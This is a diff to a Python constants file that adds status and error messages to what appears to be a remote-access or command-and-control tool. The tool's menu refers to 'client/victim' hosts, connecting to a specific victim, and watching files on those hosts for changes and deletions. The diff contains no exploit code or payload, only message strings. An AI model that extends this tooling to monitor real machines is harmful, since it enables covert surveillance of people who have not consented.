@@ -166,6 +166,12 @@ WATCH_FILE_STATUS_TRUE_ERROR = ("[+] WATCH_FILE_ERROR: This specific client (IP:
                                 "is already watching a file!")
 WATCH_FILE_STATUS_TRUE_ERROR_SUGGEST = "[+] TIP: Stop watching a file for this specific client using menu item 11"
 NOT_WATCHING_FILE_ERROR = "[+] STOP WATCH FILE ERROR: You are not currently watching a file!"
+DELETED_DIRECTORY = "deleted"
+WATCH_FILE_DELETE_DETECTED_MSG = ("[+] WATCH FILE DELETE EVENT DETECTED: The watch file '{}' has been deleted on "
+                                  "client/victim ({}, {})")
+WATCH_FILE_THREAD_TERMINATING = ("[+] THREAD TERMINATION: Now terminating the following thread: "
+                                 "Watch_File_Client_Socket Thread...")
+
 
 
 # MENU ITEM 11 - Stop Watching File
@@ -177,6 +183,9 @@ STOP_WATCH_THREAD_CONCURRENCY_WARNING = ("[+] WARNING: You are not allowed to pe
                                          "({}, {}) until they have performed one final event on the file that was "
                                          "currently being watched (i.e. Wait until Watch_File_Client_Socket thread "
                                          "has finished...)")
+WATCH_FILE_THREAD_STOP = "[+] ENDING THREAD: WATCH_FILE_THREAD has terminated!"
+WATCH_FILE_THREAD_STOP_SUCCESS = "[+] WATCH FILE SUCCESSFUL: You have stopped watching the file..."
+
 
 # MENU ITEM 12 - Connect to a specific victim
 INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
